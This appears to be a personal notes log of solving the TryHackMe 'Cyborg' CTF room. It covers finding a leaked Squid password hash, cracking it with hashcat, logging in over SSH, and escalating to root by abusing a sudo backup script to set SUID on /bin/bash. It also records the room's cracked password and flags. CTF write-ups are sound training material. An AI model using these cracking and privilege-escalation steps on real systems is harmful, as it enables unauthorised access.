### 18072023Tue

[TryHackMe | Cyborg](https://tryhackme.com/room/cyborgt8)

```
A box involving encrypted archives, source code analysis and more.
```

![[Pasted image 20230718075448.png]]

![[Pasted image 20230718075628.png]]

![[Pasted image 20230718091426.png]]

http://10.10.141.24/etc/squid/passwd

*music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.*

![[Pasted image 20230718080154.png]]

![[Pasted image 20230718080301.png]]

![[Pasted image 20230718080427.png]]

http://10.10.141.24/admin/

![[Pasted image 20230718080553.png]]

http://10.10.141.24/admin/archive.tar

![[Pasted image 20230718080918.png]]

https://borgbackup.readthedocs.io/

https://borgbackup.readthedocs.io/en/stable/

http://10.10.141.24/admin/admin.html

```
<h3 id="heading">Admin Shoutbox</h3>

        <pre>
            <code>
                ############################################
                ############################################
                [Yesterday at 4.32pm from Josh]
                Are we all going to watch the football game at the weekend??
                ############################################
                ############################################
                [Yesterday at 4.33pm from Adam]
                Yeah Yeah mate absolutely hope they win!
                ############################################
                ############################################
                [Yesterday at 4.35pm from Josh]
                See you there then mate!
                ############################################
                ############################################
                [Today at 5.45am from Alex]
                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
                ############################################
                ############################################

            
            </code>
        </pre>
```

```
cat squid.conf          
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

![[Pasted image 20230718085017.png]]

![[Pasted image 20230718085124.png]]

![[Pasted image 20230718085422.png]]

```
hashcat --force -m 1600 -a 0 /usr/share/wordlists/rockyou.txt
```

### 22072023Sat

[Cyborg Writeup(My box!) | fieldraccoon](https://fieldraccoon.github.io/posts/Cyborg/)

![[Pasted image 20230722102307.png]]

```
hashcat --force -m 1600 -a 0 /usr/share/wordlists/rockyou.txt passwd_hash
```

```
ssh alex@10.10.195.198
```

```
S3cretP@s3
```

```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

![[Pasted image 20230722103424.png]]

### 23072023Sun

![[Pasted image 20230723081509.png]]

![[Pasted image 20230723081929.png]]

```
sudo /etc/mp3backups/backup.sh -c whoami
```

![[Pasted image 20230723082327.png]]

```
sudo /etc/mp3backups/backup.sh -c ls /root/
```

![[Pasted image 20230723082509.png]]

```
sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
```

```
bash -p
```

![[Pasted image 20230723083051.png]]

```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

